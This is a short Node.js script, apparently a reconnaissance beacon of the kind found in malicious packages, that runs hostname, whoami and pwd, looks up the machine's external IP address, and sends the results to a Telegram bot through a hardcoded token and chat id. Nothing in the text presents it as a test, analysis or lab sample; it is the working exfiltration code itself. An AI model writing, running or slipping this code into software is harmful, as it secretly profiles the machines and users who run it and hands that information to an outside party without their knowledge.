const { exec } = require('child_process');
const https = require('https');
const token = '1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghi';
function run(command) {
  return new Promise((resolve) => exec(command, (_error, stdout) => resolve(stdout.trim())));
}
function externalIp() {
  return new Promise((resolve) => https.get('https://api.ipify.org', (response) => {
    let body = '';
    response.on('data', (part) => { body += part; });
    response.on('end', () => resolve(body));
  }));
}
Promise.all([run('hostname'), run('whoami'), run('pwd'), externalIp()]).then((profile) => {
  const req = https.request({
    hostname: 'api.telegram.org',
    path: `/bot${token}/sendMessage`,
    method: 'POST',
  });
  req.write(JSON.stringify({ chat_id: '123456789', text: profile.join(' ') }));
  req.end();
});
